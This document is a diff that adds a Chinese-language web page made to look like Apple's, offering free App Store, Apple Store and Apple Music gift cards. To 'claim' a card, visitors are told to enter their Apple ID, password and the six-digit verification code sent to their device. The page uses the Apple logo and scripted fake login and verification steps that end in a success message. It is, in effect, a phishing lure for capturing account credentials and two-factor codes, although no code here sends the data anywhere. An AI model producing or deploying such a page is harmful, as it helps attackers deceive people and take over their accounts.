@@ -1,0 +1,811 @@
+<html lang="zh-CN"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.tailwindcss.com"></script> 
+  <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet"> 
+  <style>
+    /* 苹果风格基础样式 */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+    }
+
+    body {
+      background-color: #fff;
+      color: #333;
+      line-height: 1.6;
+    }
+
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            primary: '#0071e3',
+            secondary: '#666',
+            neutral: {
+              100: '#f5f5f7',
+              200: '#e8e8ed',
+              800: '#333',
+              900: '#111'
+            }
+          },
+          boxShadow: {
+            'apple': '0 4px 14px rgba(0, 0, 0, 0.05), 0 1px 2px rgba(0, 0, 0, 0.1)',
+            'apple-hover': '0 10px 25px rgba(0, 0, 0, 0.08), 0 4px 10px rgba(0, 0, 0, 0.06)',
+          }
+        }
+      }
+    }
+
+    /* 苹果风格组件样式 */
+    .apple-card {
+      background-color: #fff;
+      border-radius: 12px;
+      overflow: hidden;
+      transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+    }
+    
+    .apple-card:hover {
+      transform: translateY(-5px);
+      box-shadow: var(--tw-shadow-apple-hover);
+    }
+    
+    .gift-card-image {
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .gift-card-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(135deg, rgba(0,0,0,0.1) 0%, rgba(0,0,0,0) 100%);
+      pointer-events: none;
+    }
+    
+    .card-shine {
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 50%;
+      height: 100%;
+      background: linear-gradient(90deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.2) 50%, rgba(255,255,255,0) 100%);
+      transform: skewX(-25deg);
+      transition: all 0.7s ease;
+    }
+    
+    .apple-card:hover .card-shine {
+      left: 125%;
+    }
+    
+    /* 平滑滚动 */
+    html {
+      scroll-behavior: smooth;
+    }
+
+    /* 输入框样式 */
+    .input-container {
+      position: relative;
+      max-width: 500px;
+      margin: 0 auto;
+    }
+    
+    .form-input {
+      font-size: 1.2rem;
+      padding: 1rem 1rem 1rem 3.5rem;
+      border-radius: 30px;
+      border: 1px solid #ddd;
+      transition: all 0.3s ease;
+    }
+    
+    .form-input:focus {
+      border-color: #0071e3;
+      box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.1);
+      outline: none;
+    }
+    
+    .form-input.error {
+      border-color: #ff3b30;
+      box-shadow: 0 0 0 4px rgba(255, 59, 48, 0.1);
+    }
+    
+    .input-icon {
+      position: absolute;
+      left: 1.2rem;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #666;
+    }
+    
+    .toggle-password {
+      position: absolute;
+      right: 1.2rem;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #666;
+      cursor: pointer;
+    }
+
+    /* 错误提示样式 */
+    .error-message {
+      color: #ff3b30;
+      font-size: 0.9rem;
+      margin-top: 0.5rem;
+      text-align: left;
+      padding-left: 3.5rem;
+      display: none;
+    }
+
+    /* 验证码倒计时样式 */
+    .countdown {
+      color: #0071e3;
+      font-size: 0.9rem;
+      cursor: pointer;
+    }
+    
+    .countdown.disabled {
+      color: #999;
+      cursor: not-allowed;
+    }
+
+    /* 领取按钮样式 */
+    .claim-btn {
+      background-color: #34c759;
+      color: white;
+      transition: all 0.3s ease;
+    }
+    
+    .claim-btn:hover {
+      background-color: #2db54e;
+      transform: translateY(-2px);
+    }
+    
+    .claim-btn:active {
+      transform: translateY(0);
+    }
+
+    /* 登录按钮样式 */
+    .login-btn {
+      background-color: #0071e3;
+      color: white;
+      transition: all 0.3s ease;
+    }
+    
+    .login-btn:hover {
+      background-color: #0066cc;
+      transform: translateY(-2px);
+    }
+    
+    .login-btn:active {
+      transform: translateY(0);
+    }
+
+    /* 加载动画容器 */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(255, 255, 255, 0.8);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s ease, visibility 0.3s ease;
+    }
+    
+    .loading-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+    
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid rgba(0, 113, 227, 0.1);
+      border-top-color: #0071e3;
+      border-radius: 50%;
+      animation: spin 1s ease-in-out infinite;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+  <title>礼品卡验证与领取 - 输入苹果ID和密码</title>
+</head>
+
+<body>
+  <!-- 加载动画 -->
+  <div class="loading-overlay" id="loading-overlay">
+    <div class="spinner"></div>
+  </div>
+
+  <!-- 顶部导航 -->
+  <header class="fixed top-0 left-0 right-0 bg-white/80 backdrop-blur-sm border-b border-neutral-200 z-50">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="flex items-center justify-between h-16">
+        <div class="flex items-center">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/1200px-Apple_logo_black.svg.png" alt="苹果风格图标" class="h-8 w-auto mr-2">
+          <span class="text-lg font-semibold">GiftCard</span>
+        </div>
+        
+        <!-- 桌面导航 -->
+        <nav class="hidden md:flex items-center space-x-8">
+          <a href="#home" class="text-neutral-800 hover:text-primary text-sm transition-colors">首页</a>
+          <a href="#verify" class="text-neutral-800 hover:text-primary text-sm transition-colors">登录与领取</a>
+          <a href="#cards" class="text-neutral-800 hover:text-primary text-sm transition-colors">礼品卡</a>
+        </nav>
+        
+        <!-- 移动端菜单按钮 -->
+        <button id="menu-toggle" class="md:hidden text-neutral-800">
+          <i class="fa fa-bars text-xl"></i>
+        </button>
+      </div>
+    </div>
+    
+    <!-- 移动端导航菜单 -->
+    <div id="mobile-menu" class="md:hidden hidden bg-white border-t border-neutral-200">
+      <div class="container mx-auto px-4 py-3 space-y-3">
+        <a href="#home" class="block py-2 text-sm text-neutral-800 hover:text-primary">首页</a>
+        <a href="#verify" class="block py-2 text-sm text-neutral-800 hover:text-primary">登录与领取</a>
+        <a href="#cards" class="block py-2 text-sm text-neutral-800 hover:text-primary">礼品卡</a>
+      </div>
+    </div>
+  </header>
+
+  <!-- 英雄区域 -->
+  <section id="home" class="pt-32 pb-20 bg-neutral-100">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="text-center max-w-3xl mx-auto">
+        <h1 class="text-4xl sm:text-5xl font-bold mb-6 leading-tight">
+          输入苹果ID和密码，<br class="sm:hidden">领取您的礼品卡
+        </h1>
+        <p class="text-lg text-secondary mb-10">
+          登录成功后验证身份即可领取礼品卡，安全、简单、高效。
+        </p>
+        <div class="flex justify-center">
+          <a href="#verify" class="bg-primary text-white px-6 py-3 rounded-full hover:bg-primary/90 transition-colors shadow-apple text-lg font-medium">
+            立即登录并领取 <i class="fa fa-arrow-right ml-2"></i>
+          </a>
+        </div>
+      </div>
+      
+      <!-- 主视觉礼品卡图片 -->
+      <div class="mt-16 max-w-3xl mx-auto">
+        <div class="rounded-2xl overflow-hidden shadow-xl transform rotate-1 hover:rotate-0 transition-transform duration-500">
+          <img src="https://picsum.photos/id/1/1200/600" alt="精美礼品卡展示，卡面上有苹果ID登录提示" class="w-full h-auto">
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 登录与领取区域 - 核心功能 -->
+  <section id="verify" class="py-20 bg-white">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="text-center mb-12">
+        <h2 class="text-3xl font-bold mb-4">输入苹果ID和密码，登录并领取</h2>
+        <p class="text-secondary max-w-2xl mx-auto">请输入您的苹果ID和密码，完成身份验证后即可领取礼品卡</p>
+      </div>
+      
+      <div class="max-w-2xl mx-auto bg-neutral-100 p-8 rounded-2xl shadow-apple">
+        <!-- 登录表单区域 -->
+        <div id="login-form">
+          <!-- 苹果ID输入框 -->
+          <div class="input-container mb-2">
+            <i class="fa fa-user input-icon text-xl"></i>
+            <input type="email" id="apple-id" class="form-input w-full" placeholder="请输入您的苹果ID（通常是邮箱地址）" maxlength="100">
+          </div>
+          <div id="id-error" class="error-message">请输入有效的苹果ID（通常是邮箱地址，例如：example@domain.com）</div>
+          
+          <!-- 密码输入框 -->
+          <div class="input-container mb-6">
+            <i class="fa fa-lock input-icon text-xl"></i>
+            <input type="password" id="apple-password" class="form-input w-full" placeholder="请输入您的苹果ID密码" maxlength="20">
+            <i class="fa fa-eye toggle-password" id="toggle-password"></i>
+          </div>
+          
+          <div class="flex flex-col sm:flex-row gap-4 justify-center">
+            <button id="login-btn" class="login-btn px-6 py-3 rounded-full hover:bg-primary/90 transition-colors shadow-apple flex-1 sm:flex-none">
+              <i class="fa fa-sign-in mr-2"></i> 登录
+            </button>
+            <button id="clear-btn" class="bg-white border border-neutral-200 text-neutral-800 px-6 py-3 rounded-full hover:bg-neutral-50 transition-colors shadow-apple flex-1 sm:flex-none">
+              清除
+            </button>
+          </div>
+        </div>
+        
+        <!-- 验证码区域 -->
+        <div id="verification-code" class="hidden mt-6">
+          <div class="text-center mb-6">
+            <h3 class="text-xl font-medium">验证您的身份</h3>
+            <p class="text-secondary mt-2">验证码已发送至您的苹果ID关联设备 <span id="verification-device" class="font-medium"></span></p>
+          </div>
+          
+          <!-- 验证码输入框 -->
+          <div class="input-container mb-2">
+            <i class="fa fa-shield input-icon text-xl"></i>
+            <input type="text" id="code-input" class="form-input w-full" placeholder="请输入6位验证码" maxlength="6">
+          </div>
+          <div class="flex justify-between items-center mb-6">
+            <div id="code-error" class="error-message">请输入有效的6位验证码</div>
+            <span id="resend-code" class="countdown">重新发送</span>
+          </div>
+          
+          <div class="flex justify-center">
+            <button id="verify-code-btn" class="login-btn px-8 py-3 rounded-full hover:bg-primary/90 transition-colors shadow-apple">
+              <i class="fa fa-check mr-2"></i> 验证并领取
+            </button>
+          </div>
+        </div>
+        
+        <!-- 领取成功提示 -->
+        <div id="claimed-success" class="mt-8 hidden">
+          <div class="p-6 bg-white rounded-xl border border-blue-100">
+            <div class="flex items-start">
+              <div class="flex-shrink-0 mt-1">
+                <i class="fa fa-star text-blue-500 text-2xl"></i>
+              </div>
+              <div class="ml-4">
+                <h3 class="text-lg font-medium text-blue-800">领取成功！</h3>
+                <div class="mt-2 text-sm text-neutral-800">
+                  <p>礼品卡已成功添加至您的苹果账户，可在App Store或Apple Store中使用。</p>
+                  <p class="mt-2"><span class="font-medium">礼品卡金额：</span><span id="final-balance">¥200.00</span></p>
+                  <p class="mt-1"><span class="font-medium">有效期至：</span><span id="final-expiry">2024-12-31</span></p>
+                </div>
+                <div class="mt-4">
+                  <button class="text-primary hover:text-primary/80 text-sm font-medium">
+                    查看我的礼品卡 <i class="fa fa-arrow-right ml-1"></i>
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 礼品卡展示区 -->
+  <section id="cards" class="py-20 bg-neutral-100">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="text-center mb-16">
+        <h2 class="text-3xl font-bold mb-4">礼品卡系列</h2>
+        <p class="text-secondary max-w-2xl mx-auto">
+          所有礼品卡均需输入苹果ID和密码登录，并通过验证码验证后领取使用
+        </p>
+      </div>
+      
+      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8">
+        <!-- 礼品卡1 -->
+        <div class="apple-card shadow-apple">
+          <div class="gift-card-image h-56">
+            <img src="https://picsum.photos/id/26/600/400" alt="App Store礼品卡，卡面上有苹果ID登录提示" class="w-full h-full object-cover">
+            <div class="gift-card-overlay"></div>
+            <div class="card-shine"></div>
+          </div>
+          <div class="p-6">
+            <h3 class="text-xl font-bold mb-2">App Store礼品卡</h3>
+            <p class="text-secondary mb-4">
+              输入苹果ID和密码登录后，验证身份即可领取使用
+            </p>
+            <div class="flex justify-between items-center">
+              <span class="text-green-600 font-bold">多种面额</span>
+              <a href="#verify" class="text-primary hover:text-primary/80 flex items-center">
+                立即领取 <i class="fa fa-arrow-right ml-2"></i>
+              </a>
+            </div>
+          </div>
+        </div>
+        
+        <!-- 礼品卡2 -->
+        <div class="apple-card shadow-apple">
+          <div class="gift-card-image h-56">
+            <img src="https://picsum.photos/id/42/600/400" alt="Apple Store礼品卡，卡面上有苹果ID登录提示" class="w-full h-full object-cover">
+            <div class="gift-card-overlay"></div>
+            <div class="card-shine"></div>
+          </div>
+          <div class="p-6">
+            <h3 class="text-xl font-bold mb-2">Apple Store礼品卡</h3>
+            <p class="text-secondary mb-4">
+              输入苹果ID和密码登录后，验证身份即可领取使用
+            </p>
+            <div class="flex justify-between items-center">
+              <span class="text-green-600 font-bold">多种面额</span>
+              <a href="#verify" class="text-primary hover:text-primary/80 flex items-center">
+                立即领取 <i class="fa fa-arrow-right ml-2"></i>
+              </a>
+            </div>
+          </div>
+        </div>
+        
+        <!-- 礼品卡3 -->
+        <div class="apple-card shadow-apple">
+          <div class="gift-card-image h-56">
+            <img src="https://picsum.photos/id/96/600/400" alt="Apple Music礼品卡，卡面上有苹果ID登录提示" class="w-full h-full object-cover">
+            <div class="gift-card-overlay"></div>
+            <div class="card-shine"></div>
+          </div>
+          <div class="p-6">
+            <h3 class="text-xl font-bold mb-2">Apple Music礼品卡</h3>
+            <p class="text-secondary mb-4">
+              输入苹果ID和密码登录后，验证身份即可领取使用
+            </p>
+            <div class="flex justify-between items-center">
+              <span class="text-green-600 font-bold">多种面额</span>
+              <a href="#verify" class="text-primary hover:text-primary/80 flex items-center">
+                立即领取 <i class="fa fa-arrow-right ml-2"></i>
+              </a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 使用流程 -->
+  <section class="py-20 bg-white">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="text-center mb-16">
+        <h2 class="text-3xl font-bold mb-4">简单五步，轻松领取</h2>
+        <p class="text-secondary max-w-2xl mx-auto">
+          输入苹果ID和密码，通过验证后即可安全领取礼品卡
+        </p>
+      </div>
+      
+      <div class="grid grid-cols-1 md:grid-cols-5 gap-6 max-w-6xl mx-auto">
+        <!-- 步骤1 -->
+        <div class="text-center">
+          <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mb-6 mx-auto">
+            <span class="text-primary font-bold text-xl">1</span>
+          </div>
+          <h3 class="text-xl font-bold mb-3">准备苹果账号</h3>
+          <p class="text-secondary">
+            准备好您的苹果ID和对应的密码
+          </p>
+        </div>
+        
+        <!-- 步骤2 -->
+        <div class="text-center">
+          <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mb-6 mx-auto">
+            <span class="text-primary font-bold text-xl">2</span>
+          </div>
+          <h3 class="text-xl font-bold mb-3">输入账号信息</h3>
+          <p class="text-secondary">
+            在上方输入框中填写您的苹果ID和密码
+          </p>
+        </div>
+        
+        <!-- 步骤3 -->
+        <div class="text-center">
+          <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mb-6 mx-auto">
+            <span class="text-primary font-bold text-xl">3</span>
+          </div>
+          <h3 class="text-xl font-bold mb-3">等待验证</h3>
+          <p class="text-secondary">
+            系统将验证您的苹果账号信息，请耐心等待
+          </p>
+        </div>
+        
+        <!-- 步骤4 -->
+        <div class="text-center">
+          <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mb-6 mx-auto">
+            <span class="text-primary font-bold text-xl">4</span>
+          </div>
+          <h3 class="text-xl font-bold mb-3">输入验证码</h3>
+          <p class="text-secondary">
+            输入发送至您苹果设备的验证码完成验证
+          </p>
+        </div>
+        
+        <!-- 步骤5 -->
+        <div class="text-center">
+          <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mb-6 mx-auto">
+            <span class="text-primary font-bold text-xl">5</span>
+          </div>
+          <h3 class="text-xl font-bold mb-3">领取使用</h3>
+          <p class="text-secondary">
+            验证成功后即可领取并使用礼品卡
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 页脚 -->
+  <footer class="bg-neutral-100 py-12 border-t border-neutral-200">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
+        <div>
+          <div class="flex items-center mb-4">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/1200px-Apple_logo_black.svg.png" alt="苹果风格图标" class="h-6 w-auto mr-2">
+            <span class="font-semibold">GiftCard</span>
+          </div>
+          <p class="text-sm text-secondary mb-4">
+            输入苹果ID和密码，通过验证码验证即可领取礼品卡，安全高效
+          </p>
+          <div class="flex space-x-4">
+            <a href="#" class="text-secondary hover:text-primary transition-colors">
+              <i class="fa fa-weixin"></i>
+            </a>
+            <a href="#" class="text-secondary hover:text-primary transition-colors">
+              <i class="fa fa-weibo"></i>
+            </a>
+            <a href="#" class="text-secondary hover:text-primary transition-colors">
+              <i class="fa fa-instagram"></i>
+            </a>
+          </div>
+        </div>
+        
+        <div>
+          <h4 class="font-medium mb-4">快速链接</h4>
+          <ul class="space-y-2 text-sm">
+            <li><a href="#home" class="text-secondary hover:text-primary transition-colors">首页</a></li>
+            <li><a href="#verify" class="text-secondary hover:text-primary transition-colors">登录与领取</a></li>
+            <li><a href="#cards" class="text-secondary hover:text-primary transition-colors">礼品卡</a></li>
+          </ul>
+        </div>
+        
+        <div>
+          <h4 class="font-medium mb-4">帮助中心</h4>
+          <ul class="space-y-2 text-sm">
+            <li><a href="#" class="text-secondary hover:text-primary transition-colors">未收到验证码？</a></li>
+            <li><a href="#" class="text-secondary hover:text-primary transition-colors">忘记苹果ID或密码？</a></li>
+            <li><a href="#" class="text-secondary hover:text-primary transition-colors">使用条款</a></li>
+          </ul>
+        </div>
+      </div>
+      
+      <div class="pt-8 border-t border-neutral-200 text-center text-sm text-secondary">
+        <p>© 2023 GiftCard. 保留所有权利。</p>
+      </div>
+    </div>
+  </footer>
+
+  <!-- 回到顶部按钮 -->
+  <button id="back-to-top" class="fixed bottom-6 right-6 bg-primary text-white w-10 h-10 rounded-full flex items-center justify-center shadow-apple opacity-0 invisible transition-all duration-300">
+    <i class="fa fa-chevron-up"></i>
+  </button>
+
+  <script>
+    // 移动端菜单切换
+    const menuToggle = document.getElementById('menu-toggle');
+    const mobileMenu = document.getElementById('mobile-menu');
+    
+    menuToggle.addEventListener('click', () => {
+      mobileMenu.classList.toggle('hidden');
+    });
+    
+    // 回到顶部按钮
+    const backToTopButton = document.getElementById('back-to-top');
+    
+    window.addEventListener('scroll', () => {
+      if (window.scrollY > 300) {
+        backToTopButton.classList.remove('opacity-0', 'invisible');
+        backToTopButton.classList.add('opacity-100', 'visible');
+      } else {
+        backToTopButton.classList.add('opacity-0', 'invisible');
+        backToTopButton.classList.remove('opacity-100', 'visible');
+      }
+    });
+    
+    backToTopButton.addEventListener('click', () => {
+      window.scrollTo({
+        top: 0,
+        behavior: 'smooth'
+      });
+    });
+    
+    // 密码显示/隐藏切换
+    const passwordInput = document.getElementById('apple-password');
+    const togglePassword = document.getElementById('toggle-password');
+    
+    togglePassword.addEventListener('click', () => {
+      // 切换密码可见性
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+      
+      // 切换图标
+      togglePassword.classList.toggle('fa-eye');
+      togglePassword.classList.toggle('fa-eye-slash');
+    });
+    
+    // 苹果ID验证逻辑
+    const appleIdInput = document.getElementById('apple-id');
+    const idError = document.getElementById('id-error');
+    const loginForm = document.getElementById('login-form');
+    const verificationCode = document.getElementById('verification-code');
+    const verificationDevice = document.getElementById('verification-device');
+    const codeInput = document.getElementById('code-input');
+    const codeError = document.getElementById('code-error');
+    const resendCode = document.getElementById('resend-code');
+    const verifyCodeBtn = document.getElementById('verify-code-btn');
+    const claimedSuccess = document.getElementById('claimed-success');
+    const loadingOverlay = document.getElementById('loading-overlay');
+    
+    // 苹果ID验证正则表达式（通常是邮箱格式）
+    const appleIdRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    
+    // 实时验证苹果ID格式
+    appleIdInput.addEventListener('input', () => {
+      validateAppleId();
+    });
+    
+    // 苹果ID验证函数
+    function validateAppleId() {
+      const appleIdValue = appleIdInput.value.trim();
+      
+      if (appleIdValue && !appleIdRegex.test(appleIdValue)) {
+        appleIdInput.classList.add('error');
+        idError.style.display = 'block';
+        return false;
+      } else {
+        appleIdInput.classList.remove('error');
+        idError.style.display = 'none';
+        return true;
+      }
+    }
+    
+    // 验证码验证函数
+    function validateCode() {
+      const codeValue = codeInput.value.trim();
+      
+      if (codeValue.length !== 6 || isNaN(codeValue)) {
+        codeInput.classList.add('error');
+        codeError.style.display = 'block';
+        return false;
+      } else {
+        codeInput.classList.remove('error');
+        codeError.style.display = 'none';
+        return true;
+      }
+    }
+    
+    // 验证码输入验证
+    codeInput.addEventListener('input', () => {
+      validateCode();
+    });
+    
+    // 登录按钮功能
+    document.getElementById('login-btn').addEventListener('click', () => {
+      const appleIdValue = appleIdInput.value.trim();
+      const passwordValue = passwordInput.value;
+      
+      // 验证苹果ID格式
+      if (!validateAppleId()) {
+        return;
+      }
+      
+      // 验证苹果ID不为空
+      if (!appleIdValue) {
+        appleIdInput.classList.add('error');
+        idError.textContent = '请输入您的苹果ID';
+        idError.style.display = 'block';
+        return;
+      }
+      
+      // 验证密码长度
+      if (passwordValue.length < 6) {
+        alert('请输入至少6位密码');
+        return;
+      }
+      
+      // 显示加载动画
+      loadingOverlay.classList.add('active');
+      
+      // 模拟登录验证过程（2秒延迟）
+      setTimeout(() => {
+        // 隐藏加载动画
+        loadingOverlay.classList.remove('active');
+        
+        // 生成模拟设备名称
+        const devices = ['iPhone', 'iPad', 'Mac'];
+        const randomDevice = devices[Math.floor(Math.random() * devices.length)];
+        verificationDevice.textContent = randomDevice;
+        
+        // 显示验证码区域
+        loginForm.classList.add('hidden');
+        verificationCode.classList.remove('hidden');
+        
+        // 开始倒计时
+        startCountdown();
+        
+        // 滚动到验证码区域
+        verificationCode.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+      }, 2000);
+    });
+    
+    // 清除按钮功能
+    document.getElementById('clear-btn').addEventListener('click', () => {
+      appleIdInput.value = '';
+      passwordInput.value = '';
+      appleIdInput.classList.remove('error');
+      idError.style.display = 'none';
+    });
+    
+    // 验证码倒计时功能
+    function startCountdown() {
+      let seconds = 60;
+      resendCode.classList.add('disabled');
+      resendCode.textContent = `重新发送(${seconds}s)`;
+      
+      const countdownInterval = setInterval(() => {
+        seconds--;
+        resendCode.textContent = `重新发送(${seconds}s)`;
+        
+        if (seconds <= 0) {
+          clearInterval(countdownInterval);
+          resendCode.classList.remove('disabled');
+          resendCode.textContent = '重新发送';
+        }
+      }, 1000);
+    }
+    
+    // 重新发送验证码
+    resendCode.addEventListener('click', () => {
+      if (!resendCode.classList.contains('disabled')) {
+        // 显示加载动画
+        loadingOverlay.classList.add('active');
+        
+        // 模拟发送验证码过程
+        setTimeout(() => {
+          loadingOverlay.classList.remove('active');
+          startCountdown();
+          alert('验证码已重新发送至您的苹果设备');
+        }, 1000);
+      }
+    });
+    
+    // 验证验证码并领取礼品卡
+    verifyCodeBtn.addEventListener('click', () => {
+      // 验证验证码
+      if (!validateCode()) {
+        return;
+      }
+      
+      // 显示加载动画
+      loadingOverlay.classList.add('active');
+      
+      // 模拟验证过程
+      setTimeout(() => {
+        // 隐藏加载动画
+        loadingOverlay.classList.remove('active');
+        
+        // 显示领取成功提示
+        verificationCode.classList.add('hidden');
+        claimedSuccess.classList.remove('hidden');
+        
+        // 滚动到成功提示区域
+        claimedSuccess.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+      }, 1500);
+    });
+    
+    // 图片加载动画
+    document.addEventListener('DOMContentLoaded', () => {
+      const images = document.querySelectorAll('img');
+      images.forEach(img => {
+        img.style.opacity = '0';
+        img.style.transition = 'opacity 0.5s ease';
+        
+        img.onload = () => {
+          img.style.opacity = '1';
+        };
+        
+        // 如果图片已经缓存
+        if (img.complete) {
+          img.style.opacity = '1';
+        }
+      });
+    });
+  </script>
+
+
+    </body></html>
+    
